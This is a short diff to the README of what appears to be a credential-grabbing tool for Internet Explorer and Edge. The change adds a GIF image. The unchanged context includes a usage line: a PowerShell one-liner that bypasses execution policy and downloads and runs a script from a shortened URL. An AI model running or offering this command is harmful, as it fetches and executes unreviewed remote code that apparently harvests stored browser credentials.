@@ -9,6 +9,9 @@ Date: 04/2018
 ## Usage
 powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2K75g15')"
 
+<img src="https://raw.githubusercontent.com/HanseSecure/credgrap_ie_edge/master/image/credgrap.gif" width="40" height="40" />
+
+
 ## Recommendation
 
 ### Powershell Solution
